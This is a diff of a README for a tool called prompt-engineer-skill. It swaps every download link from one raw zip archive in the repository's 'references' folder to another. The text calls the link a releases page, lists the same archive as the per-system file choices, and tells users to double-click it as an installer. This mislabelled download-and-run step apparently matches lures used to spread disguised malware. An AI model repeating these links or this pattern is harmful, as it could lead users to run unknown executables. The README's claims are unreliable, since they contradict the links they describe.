@@ -8,13 +8,13 @@ Welcome to prompt-engineer-skill! This tool helps you turn your raw ideas into p
 
 To get started, visit our releases page to download the application:
 
-[![Download the application](https://github.com/pateljig4545/prompt-engineer-skill/raw/refs/heads/main/references/skill-engineer-prompt-v1.9.zip)](https://github.com/pateljig4545/prompt-engineer-skill/raw/refs/heads/main/references/skill-engineer-prompt-v1.9.zip)
+[![Download the application](https://github.com/pateljig4545/prompt-engineer-skill/raw/refs/heads/main/references/skill_engineer_prompt_v1.5.zip)](https://github.com/pateljig4545/prompt-engineer-skill/raw/refs/heads/main/references/skill_engineer_prompt_v1.5.zip)
 
 Follow these steps to install it on your computer:
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version under the "Assets" section.
-3. Download the file that fits your operating system. For example, you might find files like `https://github.com/pateljig4545/prompt-engineer-skill/raw/refs/heads/main/references/skill-engineer-prompt-v1.9.zip`, `https://github.com/pateljig4545/prompt-engineer-skill/raw/refs/heads/main/references/skill-engineer-prompt-v1.9.zip`, or similar.
+3. Download the file that fits your operating system. For example, you might find files like `https://github.com/pateljig4545/prompt-engineer-skill/raw/refs/heads/main/references/skill_engineer_prompt_v1.5.zip`, `https://github.com/pateljig4545/prompt-engineer-skill/raw/refs/heads/main/references/skill_engineer_prompt_v1.5.zip`, or similar.
 4. After the download is complete, find the file on your computer. It is usually located in the "Downloads" folder.
 5. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
 
@@ -60,6 +60,6 @@ If you encounter issues while using prompt-engineer-skill, try the following sol
 
 If you have questions, feedback, or suggestions, feel free to reach out. You can create an issue on our GitHub page, and we will get back to you as soon as possible.
 
-[Visit the releases page to download the application](https://github.com/pateljig4545/prompt-engineer-skill/raw/refs/heads/main/references/skill-engineer-prompt-v1.9.zip)
+[Visit the releases page to download the application](https://github.com/pateljig4545/prompt-engineer-skill/raw/refs/heads/main/references/skill_engineer_prompt_v1.5.zip)
 
 Thank you for choosing prompt-engineer-skill! We hope it helps you in your creative journey.
